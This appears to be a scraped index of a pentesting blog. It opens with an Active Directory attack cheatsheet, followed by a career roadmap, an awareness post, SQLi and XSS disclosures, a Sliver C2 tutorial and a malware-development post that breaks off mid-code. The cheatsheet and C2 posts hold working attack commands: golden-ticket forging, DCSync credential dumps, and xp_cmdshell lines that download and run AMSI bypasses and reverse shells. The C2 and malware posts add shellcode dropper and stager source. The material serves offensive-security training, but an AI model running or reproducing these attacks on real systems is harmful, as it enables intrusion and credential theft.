/createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dc\\C$\\Users\\Public\\Loader.exe /Y winrs -r:dc cmd netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe lsadump::trust /patch                        Grab the RC4 of [ In ] child domain -&gt; parent domain**                Create the inter-realm TGT using the trust key:        C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:&lt;hash&gt; /user:Administrator /service:krbtgt /target:domain.local /ticket:C:\\AD\\Tools\\trust_tkt.kirbi\" \"exit\"               C:\\AD\\Tools\\Rubeus.exe asktgs /ticket:C:\\AD\\Tools\\trust_tkt.kirbi /service:CIFS/domain-dc.domain.local /dc:domain-dc.domain.local /ptt               klist               dir \\\\domain-dc.domain.local\\c$                        Using KRBTGT Hash         Create inter-realm TGT with SID history for Enterprise Admins:        C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:&lt;hash&gt; /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt\" \"exit\" klist winrs -r:domain-dc cmd                         Abuse Trust Relationship (Forest)                      C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /aes256:&lt;hash&gt; /ptt\" lsadump::dcsync /user:domain\\user$ /domain:domain.local               Copy SafetyKatz and Rubeus:        echo F | xcopy C:\\AD\\Tools\\BetterSafetyKatz.exe \\\\dc.domain.local\\C$\\Users\\Public\\BetterSafetyKatz.exe /Y echo F | xcopy C:\\AD\\Tools\\Rubeus.exe \\\\dc.domain.local\\C$\\Users\\Public\\Rubeus.exe /Y               Forge an inter-realm TGT:        winrs -r:dc.domain.local cmd C:\\Users\\Public\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /rc4:&lt;hash&gt; /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\\Users\\Public\\sharedwithdomain.kirbi\" \"exit\" C:\\Users\\Public\\Rubeus.exe asktgs /ticket:C:\\Users\\Public\\sharedwithdomain.kirbi /service:CIFS/dc.domain.local /dc:dc.domain.local /ptt               With the CIFS service we can access the share:        dir \\\\dc.domain.local\\eushare                        Access the target forest using PowerShell Remoting                Check if SIDHistroy is enabled for the trust between the 2 Forests:        echo F | xcopy C:\\AD\\Tools\\InviShell\\InShellProf.dll \\\\dc.domain.local\\C$\\Users\\Public\\InShellProf.dll /Y echo F | xcopy C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat \\\\dc.domain.local\\C$\\Users\\Public\\RunWithRegistryNonAdmin.bat /Y winrs -r:dc.domain.local cmd C:\\Users\\Public\\RunWithRegistryNonAdmin.bat               Check if there are any groups with SID&gt;1000:        Get-ADGroup -Filter 'SID -ge \"S-1-5-21-4066061358-3942393892-617142613-1000\"' -Server domain.local               Create an inter-realm ticket and Inject the SIDHistory:        C:\\Users\\Public\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:&lt;hash&gt; /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\\Users\\Public\\domainnet.kirbi\" \"exit\"               Request a TGS for HTTP:        C:\\Users\\Public\\Rubeus.exe asktgs /ticket:C:\\Users\\Public\\domainnet.kirbi /service:HTTP/domain-net.domain.local /dc:dc.domain.local /ptt winrs -r:domain-net.domain.local cmd whoami /groups                         MSSQL             Enumerate database links:        Import-Module .\\PowerupSQL-master\\PowerupSQL.psd1 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose Get-SQLServerLink -Instance us-mssql.domain.local -Verbose Get-SQLServerLinkCrawl -Instance us-mssql -Verbose Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''               Open a Listener:        . .\\powercat.ps1 powercat -l -v -p 443 -t 1000 Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c \"iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)\"'''               Enable RPC Out and xp_cmdshell with SA permission:        Invoke-SqlCmd -Query \"exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'\" Invoke-SqlCmd -Query \"exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'\" Invoke-SqlCmd -Query \"EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT \"\"db-sqlsrv\"\"\" Invoke-SqlCmd -Query \"EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT \"\"db-sqlsrv\"\"\"               Now Try to execute commands recursively again:        Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''               Execute commands in a particular link database:        Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c \"iex (iwr -UseBasicParsing http://192.168.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/Invoke-PowerShellTcpEx.ps1)\"''' -QueryTarget db-sqlsrv                         Foreign Security Principals (FSPs)                      iex (New-Object Net.WebClient).DownloadString('http://192.168.100.x/PowerView.ps1') Note: Make sure to bypass AMSI before executing powershell commands Get-ForestTrust               Search for:                  TrustType: Forest         TrustDirection: Bidirectional               Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local                        See if any IdentityReferenceName has ActiveDirectoryRights (GenericAll) to any ObjectDN                Set-DomainUserPassword -Identity dbxsvc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose               Enumerate FSPs:        Find-ForeignGroup –Verbose               Get-DomainUser:        Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-4101'}               Accessing with WINRS:        winrs -r:db-dc.db.local -u:dbvendor\\dbxsvc -p:Password@123 \"whoami\"               Accessing with PowerShell Remote:        $passwd = ConvertTo-SecureString 'Password@123' -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential (\"dbvendor\\dbxsvc\", $passwd) $dbdc = New-PSSession -Computername db-dc.db.local -Credential $creds Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc                         PAM Trust                      Enumerate Foreign Security Principals:        Get-ADObject -Filter {objectClass -eq \"foreignSecurityPrincipal\"} -Server domain.local               Find out which group DA it is a member of:        Get-ADGroup -Filter * -Properties Member -Server domain.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}                        In this case the DA is a member of the built-in administrators group on the target forest                So we need to grab a DA access:        C:\\AD\\Tools\\Rubeus.exe asktgt /domain:&lt;domain&gt; /user:administrator /aes256:&lt;hash&gt; /dc:&lt;dc&gt; /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt echo F | xcopy C:\\AD\\Tools\\InviShell\\InShellProf.dll \\\\dc.domain.local\\C$\\Users\\Public\\InShellProf.dll /Y echo F | xcopy C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat \\\\dc.domain.local\\C$\\Users\\Public\\RunWithRegistryNonAdmin.bat /Y winrs -r:dc.domain.local cmd C:\\Users\\Public\\RunWithRegistryNonAdmin.bat               Check if PAM trust is enabled:        Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}               Search for:                  ForestTransitive : True         SIDFilteringForestAware : False         the DistinguishedName               Use the privileges of DA to extract credentials of DA of the target Forest:        C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:domain\\Administrator /domain:domain.local\" \"exit\" C:\\AD\\Tools\\Rubeus.exe asktgt /domain:domain.local /user:administrator /aes256:&lt;hash&gt; /dc:&lt;dc&gt; /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt echo F | xcopy C:\\AD\\Tools\\InviShell\\InShellProf.dll \\\\dc.domain.local\\C$\\Users\\Public\\InShellProf.dll /Y echo F | xcopy C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat \\\\dc.domain.local\\C$\\Users\\Public\\RunWithRegistryNonAdmin.bat /Y winrs -r:dc.domain.local cmd C:\\Users\\Public\\RunWithRegistryNonAdmin.bat               Enumerate other Forests:        Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local               Search for:                  ForestTransitive : True         SIDFilteringForestAware : True               Check the membership of Shadow Security Principals:        Get-ADObject -SearchBase (\"CN=Shadow Principal Configuration,CN=Services,\" + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name, member, msDS-ShadowPrincipalSid | fl               Obtain the IP of Forest:        Get-DnsServerZone -ZoneName production.local |fl *               Modify WSMan Trustedhosts property:        Note: Run from an elevated shell Set-Item WSMan:\\localhost\\Client\\TrustedHosts * -Force               Use PowerShell Remoting:        C:\\AD\\Tools\\SafetyKatz.exe \"sekurlsa::opassth /user:administrator /domain:domain.local /ntlm:&lt;hash&gt; /run:powershell.exe\" \"exit\" Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential                         Mindmaps                      AD Mindmap:                  AD Recommendations:                  DACL:                  Bypass AV:                  Bloodhound Collector:                      ","categories": ["notes","crte"],
        "tags": ["intermediate","AD","Windows","cheatsheet"],
        "url": "/notes/crte/cheatsheet/",
        "teaser": "/assets/images/posts/crte/crte-teaser6.jpg"
      },{
        "title": "How to become a Pentester (2024)",
        "excerpt":"  Roadmap Pentest - 2024      A lot of people asked me (maybe 3 jk) So…    Here’s my honest opinion in what’s the most effective path to be a Pentester               There is no “correct path”. Each one build its own path, because everyone has a different background    IF you have no patience just click in the link below to go to the last chapter:   CHAPTER: Summarizing      Background   So lets speak about background - What I mean by this?      “First of all Pentest is like Bangladesh, not for beginners” -Nullified       Its recommended that you have a field of expertise.   This field can vary from:  - Network Admin - Developer - System Admin  - Others      btw A complete beginner can start as an IT Support before choosing a more advanced field    You may ask: Why a field before pentesting is important?   Its important cause it helps you be a good professional!      “Pentest is only fun if you are good enough to find stuff”    You dont need to be an Expert in any of those, but a intermediate level gonna be helpful   How Helpful?   Pentest learns through the job, that means that u’ll Test a lot of technology that you’ve never seen before      And if you have knowledge in those fields, u’ll mix them with the curiosity and skills of breaking stuff   Networking is gonna be helpful to understand the infrastructure, to understand the defense mechanisms in order to be stealthy and consequently bypass the defense   System admin gonna be helpful to know the commands, directories, patterns, important files, etc of a operational system (Unix, Windows, MacOS, etc)   Developer from my point of view is the most helpful field, cause you’ll be a good web pentester, you’ll learn how to develop exploits much easier and be a great asset for the team because of that      Lets say you go directly to Pentest, Its ok too, but u’ll lack fundamentals and it’ll be much harder to learn stuff on the spot    BUILD   Each professional will have these skills in rankings, just like a RPG!   Lets grab an Example:                  Network       Programming       System                 ★★★★☆       ★★☆☆☆       ★★★☆☆              Not an Expert in any field, but have the fundamentals (or at least try to have)    This is the professional BEFORE going to PENTEST!   Besides the fundamentals, a security professional will have a large set of skills, for example:                  Fundamentals       Audit       Forensics       Reverse Engineering       Cyber Operation                 ★★★★☆       ★★★☆☆       ★★☆☆☆       ★★★☆☆       ★★★★☆           There is also the SOFT SKILLS:      Soft skills equals Communication, Documentation and Leadership                  Fundamentals       Audit       Forensics       Reverse Engineering       Cyber Operation       Soft Skills                 ★★★★☆       ★★★☆☆       ★★☆☆☆       ★★★☆☆       ★★★★☆       ★★★☆☆           And each topic has its owns sub-topics, for example:                  Web       API       Mobile       Active Directory       Container       Cloud       Physical Pentest       Low Level       etc              Thats your BUILD. Everybody likes different things, and thats good!       Because a TEAM needs people with different set of skills and its Impossible to master everything (maybe not impossible, but lets say: it takes a lot of time )    So, As you progress you’ll have a set of skills to “build your character”      Thats why the fundamentals are important    Roadmap      Enough of Chit-Chat    OK, lets say you’re not a begginer and want to go from a Desktop Support to a Pentester (developer, network admin, sys admin is even better as I said before)   What Do I recommend?      4 Steps - straight to the point    1. Learn the fundamentals      (Basics of Security, Linux, Windows, Networking, one Programming language)       You can learn the basics of Security from Security+ CompTIA material   You can learn Linux from LPIC-1 LPI material or from Linux+ CompTIA material   You can learn Network from Network+ CompTIA material   You can learn Windows from Microsoft material   You can learn a Programming Language with freecodecamp or CodeAcademy   Plus - Youtube is a helpful resource for everything nowadays      The programming language can be Python, Ruby, C, C++, Javascript, C#, Java, PHP, etc doesn’t matter - pick one that you like the most       I say that doesn’t matter, because u’ll learn others throughout your journey anyway      But if I could start again i’d choose C for internal and Javascript for external    Where to learn the fundamentals?      The best place to start in my opinion is TryHackMe. But here are some suggestions:       TryHackMe   Hack The Box   VulnHub   OverTheWire - Wargames   2. Certifications   In my opinion Certifications are important because it gives u the material organized.      btw, it can be done without certifications, but it requires a GREAT organization and patience that I dont have       Cause Sometimes you are saving money, but you are spending a lot of time to learn the same topic.       Anyway Keep in mind: Balance is everything    So, there is 2 types of certifications      The ones that you will use to LEARN   The ones that will help u to get a JOB   In my opinion The best PATH is      eJPT by INE   One full practical pentest cert (eCPPT, PNPT, CPTS) - In my opinion, the best here are the two last ones (PNPT by TCM or CPTS by HackTheBox)   Get one cert to bypass HR + To get a JOB (OSCP, CEH) - These are the most asked, both are expensive and not great, but their purposes is to get you a job, I’d rather choose OSCP here   After that, choose a Field of specialization (Mobile, Container, IOT, Cloud security, Car hacking, WiFi hacking, Linux, Windows, Malware Development, etc) There are so many fields, choose one that u like the most   With XP, Certifications and a field of specialization in no time you’ll be a valuable asset for any company   3. Job = Experience   Its a bit tricky to get the first job in pentesting because everyone asks for experience, but how you are gonna get the xp in first place if nobody wanna hire you?      Nothing in this world is guaranteed, but in my point of view    If you:      Have worked in IT before,   Are making connections on LinkedIn (this might be the most important),   Hold some certifications (especially OSCP),   Showcase your projects/GitHub on your LinkedIn/Socials   You are on the right path to get a JOB in the offensive security field!      If u r feeling like you’re sending ur resume into a black hole and getting zero love in return, you’re not alone.    Perhaps you need to get a job in cyber first:      SOC positions;   Security Analyst;   OSINT analyst   etc   And then LATER switch to Pentest!      [NOTE] In your studies for Pentest, not only learn how to attack but also take some time to learn how to mitigate the vulnerability!       4. Specialization   So, you’ve nailed that job – congrats! But here’s the thing, in OffSec, the learning never stops!      Start to think which specialization u are gonna choose. And go for it.    Keep in mind that fields are inter-connected. For example:   Windows:      If you have xp as Network Admin   C#, Powershell, C as a language   Active Directory   good path for Windows specialization   Malware Developer:      Have XP as Developer   Enjoys low level (assembly)   Likes to do research   good path for maldev   WEB:      Have IT xp   Knows Javascript and PHP   enjoy to do external pentesting   can do bug bounty on free time   good path for web      These are only examples, as I said before: u r gonna build ur own path       Anyway       What I trying to say is: U’ll get to a certain level that in order to not get stuck in ur career u gotta choose a specialization path   and every specialization has its own certifications/courses, for example:   WINDOWS:                  CRTP       CRTE       CRTO       CRTM       many others           WEB:                  eWPT       eWPTX       OSWE       BSCP       many Others           MOBILE:                  eMAPT       PJMT       8kSEC       many others           Malware Development:                  MalDev Academy       Sektor7       OSED       many others           Cloud:                  Altered Security       CWL       Cloud Breach       HackTricks              First, u gotta get a job, and then u can work towards the specialization you want       There is a lot of others certs like - SANS (expensive), EC-Council (expensive) and More   Summarizing      Learn the Fundamentals (tryhackme/compTIA)   Learn a programming language (Python)   Take eJPT and PNPT   Take OSCP (If you have enough money)   Follow a specialization path   Never stop learning   In this site below u can find a lot of certifications for cybersecurity in General:   Security Certification Roadmap   What certs I recommend for PENTEST:         After that u can choose a specialization PATH       with OSCP is easier to get a job, but lets say u dont want to spend that amount of money (like me)   Then u can think of alternatives and jump for a specialization path (AD, WEB, MOBILE, etc):      Is Pentesting Worth it?      Honestly, it’s not a paradise, but if u keep studying it can be fun    Positives:      It can be fun   Never stop learning mindset   The feeling when discovering something big   AI won’t take over (at least not yet), because manual testing yields much better results   The possibility of becoming a criminal at any time (joking here)      Some points to consider:      ~40% of the job is documentation   U need to keep studying forever (it gets tiring)   You must be at least a bit communicative, because of debriefing (its when u show the results to clients)   Sometimes the scope of projects is just a login page of a WordPress (angry face)   It pays well only if u are a Senior - Until there…   It’s hard to find a job in general because the majority of the jobs are for those who know how to harden/defend systems      Expectation X Reality                     Expectation       Reality                 It pays well       Usually pays well if u work for a bank/big company e/or u are Senior level                 Its Fun, Its Dynamic       Its actually boring, There’s a lot of bureaucracy involved with the tests (which is part of the job)                 You learn new stuff every day       Not every day, most likely 5% of the time                 You are gonna hack all the time       u hack 50% of the time, 40% is documentation, 5% is debriefing and 5% is meetings                 There’s a lack of professionals in the field       There’s a lack of SENIORS in the field              If after reading the negative points u are still interested in the field, You’ve passed the test!       Go ahead and Good luck on ur journey!   ","categories": ["insights"],
        "tags": ["tips","pentest"],
        "url": "/insights/roadmap/",
        "teaser": "/assets/images/posts/insights/roadmap/roadmap-teaser1.jpg"
      },{
        "title": "Security Awareness",
        "excerpt":"Hi, I’ve written a document covering various awareness topics such as passwords, Wi-Fi, home office, social media, and safe web browsing.   I will share the PDF here, and you can access the Word document on my GitHub (link below) to edit, add a cover image, and modify the company name accordingly.   SecurityAwareness on GitHub   Download - Word Document      I hope this document helps raise awareness in the cyber community    Introduction:   Research suggests that human error is present in 90% of information leakage cases. This guide aims to raise awareness among your employees and consequently reduce the risk of data losses, information leaks, penalties, business and resource losses, and, especially, the risk of damage to the company’s image and reputation.   The issues presented in this guide address common errors observed in the daily activities of employees in any company, such as those related to email access, internet browsing, improper use of external devices, among others. Therefore, we have included mandatory rules in this document that must be followed by all employees working with company equipment and/or in their digital environments, as well as recommendations for best practices to enhance the security of our technological environment. “Company name” will continuously monitor compliance with the rules and recommendations presented here.   PDF model:     ","categories": ["awareness"],
        "tags": ["awareness"],
        "url": "/awareness/awarenessdoc/",
        "teaser": "/assets/images/posts/awareness/teaser.jpg"
      },{
        "title": "SQL Injection (SQLi)",
        "excerpt":"               SQL Injection allows authenticated attackers to run unauthorized SQL commands, compromising systems by injecting malicious code into web forms, leading to access to sensitive data, manipulation of database contents, or even complete compromise of the system           During the assessment, a SQL Injection vulnerability was found in MHA Systems.   Through the ‘Consulta/Executa’ field, followed by clicking on any of the listed options. This functionality allows us to query records in the database:      It was identified that in any field of “Parâmetros” user input was not filtered. Because of this, our request is sent directly to the database query.   In this case, we inserted a single quote to test the error response:      The error message states that “SQL was not finished correctly”. With this information at hand, we can proceed further with the tests.      By changing the parameter to “‘UNION SELECT 1,2,3;”, the error message also changes to “Keyword FROM was not found in the request”      With this last test, it was possible to retrieve some information from the database:      To automate the exploration process, we utilized the tool SQLMAP to dump the tables of the database. As shown below, it reveals two types of payloads: Error-based and Time-based blind:      Below are the results of the DUMP:            This vulnerability was discovered by two security researchers:       João Silveira - Nullified   Leonardo Teodoro - SQU4NCH  ","categories": ["cve"],
        "tags": ["cve","web"],
        "url": "/cve/sqli/",
        "teaser": "/assets/images/posts/cve/images/cve-teaser2.jpg"
      },{
        "title": "Stored cross-site scripting (XSS)",
        "excerpt":"               Cross-Site Scripting leaves web apps vulnerable to script injections by authenticated users, risking session cookie theft, redirection to harmful sites, or unauthorized actions on behalf of users           During the assessment, a Stored Cross-Site Scripting vulnerability was discovered in MHA Systems:   Through the ‘Consulta/Cadastro’ field, followed by clicking the ‘Novo’ button. This functionality allows us to create a new record:      But as an attacker, it’s possible to inject malicious code into the ‘Query’ field:      The code is interpreted and executed by the application, which in this case showcases an alert message.      NOTE: The type of this Cross-Site Scripting is Stored. Bearing that in mind, it affects every user in the system.      This vulnerability was discovered by two security researchers:       João Silveira - Nullified   Leonardo Teodoro - SQU4NCH   ","categories": ["cve"],
        "tags": ["cve","web"],
        "url": "/cve/xss/",
        "teaser": "/assets/images/posts/cve/images/cve-teaser.jpg"
      },{
        "title": "Sliver C2",
        "excerpt":"SLIVER      DOC   https://sliver.sh/   https://github.com/BishopFox/sliver   Installation  curl https://sliver.sh/install|sudo bash   u can start the server with systemctl   run:  sliver   Types of implants      Beacons = will check in with your Server from time to time to see if u wrote some command to be executed   Session = its real time response, similar to a reverse shell      Similar but not the same. Shell is even easier to detect    Generating the Beacon:  generate beacon --http &lt;C2 IP&gt; --save .      After that, u can run SMB SERVER using IMPACKET to transfer it to the remote Windows Machine  smbserver.py kali . -smb2support -username anon -password anon      On Windows   Connect:  net use \\\\&lt;C2 ip&gt;\\kali /USER:anon anon   Copy the File:  copy \\\\&lt;C2 ip&gt;\\kali\\&lt;beacon.exe&gt; .           Bypass in necessary if the AV/EDR are enable (So, for now just disable Defender)       I’ll write about evasion in future posts and How to use staged payloads in Sliver    Listener      http/https - for communication over the HTTP(S) protocol, pretty standard across any C2   mtls - communication using mutual-TLS, a protocol in which both the implant and the server present a certificate that the other must validate. If one certificate fails, the connection does not happen.   wg - communication using WireGuard, which essentially creates a lightweight VPN to communicate over.   dns -This is all UDP and its not recommended for beginners.      Since our beacon was only configured to have an http callback, we can run http in our shell and then execute the beacon on the remote Windows computer.    sliver &gt; http      Beacons   To see the open beacons just type:  sliver &gt; beacons          As we did a Beacon instead of a Session, the beacon will check every now and then.   Sliver also has Jitter, which will make the checks a little irregular so will be less suspicious   To interact:  use &lt;beacon ID&gt; #beacons rm = to delete beacons #beacons -k &lt;ID or -K = to kill beacons      You’ll notice that it will take a time to SLIVER get the result because of the check in time      To show commands executed before:  tasks  tasks fetch &lt;ID&gt;      sessions   U can change from beacon to session, but not vice-versa:   interactive use &lt;ID&gt;   sessions  sessions -K = to kill all sessions sessions -k = (lowercase) to kill specific sessions      PROFILES  Save Profile:  profiles new beacon --arch amd64 --os windows --mtls &lt;C2 IP&gt;:443 -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 profile_name   Generate the beacon:  profiles generate --save . profile_name      You can also generate session implants in the same way, just omit the beacon part.    To show the Profiles:  profiles   To show the Implants:  implants   If u need to recover a deleted implant:   regenerate &lt;name of implant&gt;   Post-Exploitation   Staging      Stegeless = one single binary that connects back to u   Staged = Dropper, its a smaller payload that when executed, will call back to the C2 server to download and execute the second stage of the payload in-memory, which is where you actually get the beacon to execute.   Create the Profile:  profiles new beacon --arch amd64 --os windows --mtls &lt;C2 IP&gt;:443 -f shellcode --timeout 300 --seconds 5 --jitter 1 profile_name   Create the Listener to the initial Callback:  stage-listener --url http://&lt;C2 IP&gt;:8080 --profile profile_name --prepend-size      –prepend-size if you are going to use some as Metasploit/msfvenom stager Dont use the flag if you are going to write your own stager    Start the second Listener to get the second callback:  mtls --lhost &lt;C2 IP&gt; --lport 443   Generate the Stager:  generate stager -r http --lhost &lt;C2 IP&gt; --lport 8080   Example of Dropper in C:   #include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  // Define your shellcode here unsigned char shellcode[] = {     // Your shellcode goes here };  int main() {     LPVOID lpAlloc;     DWORD dwOldProtect;     HANDLE hThread;      // Allocate memory     lpAlloc = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);     if (lpAlloc == NULL) {         printf(\"VirtualAlloc failed: %d\\n\", GetLastError());         return 1;     }      // Copy shellcode to allocated memory     memcpy(lpAlloc, shellcode, sizeof(shellcode));      // Change memory protection     if (!VirtualProtect(lpAlloc, sizeof(shellcode), PAGE_EXECUTE_READ, &amp;dwOldProtect)) {         printf(\"VirtualProtect failed: %d\\n\", GetLastError());         return 1;     }      // Create a new thread to execute shellcode     hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, NULL);     if (hThread == NULL) {         printf(\"CreateThread failed: %d\\n\", GetLastError());         return 1;     }      // Wait for the thread to finish     WaitForSingleObject(hThread, INFINITE);      // Clean up     CloseHandle(hThread);     VirtualFree(lpAlloc, 0, MEM_RELEASE);      return 0; }       Run the Dropper to get a callback in your C2    Armory   Its the Extension Package Manager of Sliver which allows us to install tools that other people made   To show the packages available:  armory   To install a pack:  armory install seatbelt   Execute:  armory -i -- -group=system      BOF: Beacon Object Files   https://sliver.sh/docs?name=BOF+and+COFF+Support   Detection      https://www.microsoft.com/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/   https://www.youtube.com/watch?v=izMMmOaLn9g   Shell   remember the Session is in the currently running process, but the shell is different. Its easier to detect as we see in Windows Event:   psexec &amp; getsystem      psexec works similar to impacket, it will run a binary from C:\\Windows\\Temp and give a random 10 char name       getsystem is a macro that try to inject itself into another process spoolsv.exe (default) and abusing SeDebugPrivilege to get NT AUTHORITY\\SYSTEM within that process (similar to meterpreter)    Config Extraction (IR)   The key is to extract the config that is stored in the implant   https://www.youtube.com/watch?v=FiT7-zxQGbo           Most C2s will encrypt their config and obfuscate the code            So the config has to be descrypted in-memory and then used       References   https://tishina.in/opsec/sliver-opsec-notes   https://dominicbreuker.com/post/learning_sliver_c2_01_installation/#series-overview   https://notateamserver.xyz/sliver-101/  ","categories": ["c2"],
        "tags": ["c2","sliver"],
        "url": "/c2/sliverbasics/",
        "teaser": "/assets/images/posts/c2/c2-teaser.jpg"
      },{
        "title": "MALDEV",
        "excerpt":"Malware Development explained line by line   Lets start with stagers!   You may ask: Whats is a Stager ?      its a smaller payload that when executed, will call back to the C2 server to download and execute the second stage of the payload in-memory, which is where you actually get the beacon to execute.    Easy, just imagine a pizza - every slice of that pepperoni pizza is a stage. After you eat one slice, you move on to the next. Ahhaha!      you’ll never forget it    And a Stageless Dropper is like a Big Mac - you eat the whole thing. You Got the idea.   When Should I use it ?   We generally use it, when we want to get access to systems, but we cant directly run the malicious shellcode on the target machine, because it’ll get detected and blocked by AV/EDR.   So, we can write droppers to try to bypass these defensive measures and execute the second stage of the payload later after the callback to our C2 (for example).             C++ Stager                            #include &lt;windows.h&gt;Includes necessary header file for Windows API functions. #include &lt;wininet.h&gt;Includes necessary header file for internet-related functions. #include &lt;stdio.h&gt;Includes necessary header file for standard input/output operations.  #pragma comment (lib, \"Wininet.lib\")Directs the linker to include the Wininet library during compilation.  struct Shellcode {Defines a structure named Shellcode to hold shellcode data and length.     byte* data;Pointer to byte representing the shellcode data.     DWORD len;DWORD representing the length of the shellcode. };End of Shellcode structure definition.  Shellcode Download(LPCWSTR host, INTERNET_PORT port);Prototype for the Download function to retrieve shellcode from a server. void Execute(Shellcode shellcode);Prototype for the Execute function to execute shellcode.  int main() {Entry point of the program.     ::ShowWindow(::GetConsoleWindow(), SW_HIDE); Hides the console window. If u dont wanna hide, just comment this line      Shellcode shellcode = Download(L\"sliver.labnet.local\", 80);Downloads shellcode from the specified server.     Execute(shellcode);Executes the downloaded shellcode.      return 0;Indicates successful termination of the program. }  Shellcode Download(LPCWSTR host, INTERNET_PORT port) {Downloads shellcode from a server.     HINTERNET session = InternetOpen(Opens an internet connection.         L\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36\",Specifies the user agent for the connection.         INTERNET_OPEN_TYPE_PRECONFIG,Specifies the access type for the internet session.         NULL,Specifies the proxy server.         NULL,Specifies the context value.         0);Specifies additional options.      HINTERNET connection = InternetConnect(Establishes a connection to the specified server.         session,Handle to the internet session.         host,Specifies the host name.         port,Specifies the port number.         L\"\",Specifies the user name for authentication.         L\"\",Specifies the password for authentication.         INTERNET_SERVICE_HTTP,Specifies the service to connect to.         0,Specifies additional options.         0);Specifies additional flags.      HINTERNET request = HttpOpenRequest(Opens an HTTP request handle.         connection,Handle to the internet connection.         L\"GET\",Specifies the HTTP method.         L\"/fontawesome.woff\",Specifies the resource to request.         NULL,Specifies additional headers.         NULL,Specifies additional headers.         0,Specifies additional flags.         0);Specifies additional flags.      WORD counter = 0;Initializes a counter for the retry mechanism.     while (!HttpSendRequest(request, NULL, 0, 0, 0)) {Retries HTTP request until successful or max attempts reached.         counter++;Increments the counter.         Sleep(3000);Pauses execution for 3 seconds.         if (counter &gt;= 3) {Checks if max attempts reached.             exit(0);Exits the program if max attempts reached.         }End of if statement.     }End of while loop.      DWORD bufSize = BUFSIZ;Initial buffer size for reading response.     byte* buffer = new byte[bufSize];Allocates memory for response buffer.      DWORD capacity = bufSize;Initial capacity for payload buffer.     byte* payload = (byte*)malloc(capacity);Allocates memory for payload.      DWORD payloadSize = 0;Initial size of payload.      while (true) {Loop to read response and build payload.         DWORD bytesRead;Variable to store number of bytes read.          if (!InternetReadFile(request, buffer, bufSize, &amp;bytesRead)) {Reads data from an internet file.             exit(0);Exits the program if reading fails.         }End of if statement.          if (bytesRead == 0) break;Breaks loop if no more data to read.          if (payloadSize + bytesRead &gt; capacity) {Checks if payload buffer needs resizing.             capacity *= 2;Doubles the capacity of the payload buffer.             byte* newPayload = (byte*)realloc(payload, capacity);Resizes the payload buffer.             payload = newPayload;Assigns the resized payload buffer.         }End of if statement.          for (DWORD i = 0; i &lt; bytesRead; i++) {Iterates over the read bytes.             payload[payloadSize++] = buffer[i];Copies the read bytes into the payload buffer.         }End of for loop.              }End of while loop.     byte* newPayload = (byte*)realloc(payload, payloadSize);Resizes the payload buffer to fit the actual data.      InternetCloseHandle(request);Closes the HTTP request handle.     